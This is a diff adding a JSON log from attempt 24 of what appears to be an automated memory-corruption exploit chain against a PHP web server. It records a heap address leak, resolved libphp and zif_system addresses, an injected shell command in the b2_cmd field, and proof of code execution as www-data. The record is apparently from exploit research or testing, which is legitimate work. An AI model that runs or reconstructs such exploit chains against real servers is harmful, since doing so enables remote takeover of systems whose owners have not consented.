@@ -1,0 +1,98 @@
+{
+ "attempt": 24,
+ "started": "2026-10-22T13:31:10Z",
+ "stages": [
+  {
+   "stage": "A1",
+   "chain_try": 0,
+   "status": "HTTP/1.0 500 Internal Server Error",
+   "bytes": 211,
+   "sha256": "cfe55e028a2da7faca8ae9a7f40037c11f12b23f8baada0cfc1506867eb0dd41",
+   "elapsed_s": 0.078
+  },
+  {
+   "stage": "B1",
+   "chain_try": 0,
+   "i": 0,
+   "bytes": 1666071,
+   "status": "HTTP/1.1 200 OK",
+   "elapsed_s": 0.051,
+   "decoded": 819208,
+   "zdtor": "0x7ff46bf84b60",
+   "libphp": "0x7ff46b926000",
+   "buckets": [
+    [
+     "0x7ff469600000",
+     7495
+    ],
+    [
+     "0x7ff46be00000",
+     1095
+    ],
+    [
+     "0x7ff469c00000",
+     87
+    ],
+    [
+     "0x7ff469400000",
+     79
+    ]
+   ],
+   "main": "0x7ff469c00000",
+   "cand_counts": {
+    "0x7ff469c00000": 87,
+    "0x7ff469400000": 79
+   },
+   "leak": "hit"
+  },
+  {
+   "stage": "A2",
+   "i": 0,
+   "status": "HTTP/1.0 500 Internal Server Error",
+   "bytes": 211,
+   "sha256": "cfe55e028a2da7faca8ae9a7f40037c11f12b23f8baada0cfc1506867eb0dd41",
+   "elapsed_s": 0.052
+  },
+  {
+   "stage": "B2",
+   "i": 0,
+   "status": "",
+   "bytes": 0,
+   "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+   "elapsed_s": 0.01,
+   "proof": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n9BIE_MW_20261022T130520Z_A24_b0\n"
+  }
+ ],
+ "success": true,
+ "marker": "9BIE_MW_20261022T130520Z_A24",
+ "bodies": {
+  "a1": {
+   "bytes": 1060211,
+   "sha256": "8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6"
+  },
+  "b1": {
+   "bytes": 33128677,
+   "sha256": "b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2"
+  },
+  "a2": {
+   "bytes": 279369,
+   "sha256": "7af66c8f35c5fa6b47a539da6dca361d19543d9f62d61e4af891c2802bd5e236"
+  },
+  "b2_first": {
+   "bytes": 451384,
+   "sha256": "ef108b51282b5826026af67c3d5819823a05b0253554aed9dcbcb026bea6e02e"
+  }
+ },
+ "S": "0x7ff469cf8398",
+ "zif_system": "0x7ff46bd8b370",
+ "b1_chain_try": 0,
+ "b1_hit_attempt": 0,
+ "b2_cmd": "id>/out/p1_a24;echo 9BIE_MW_20261022T130520Z_A24_b0>>/out/p1_a24;id>&2;echo 9BIE_MW_20261022T130520Z_A24_b0>&2",
+ "b2_hit_attempt": 0,
+ "post_health": {
+  "status": "HTTP/1.1 200 OK",
+  "bytes": 195,
+  "body": "OK\n"
+ },
+ "finished": "2026-10-22T13:31:14Z"
+}
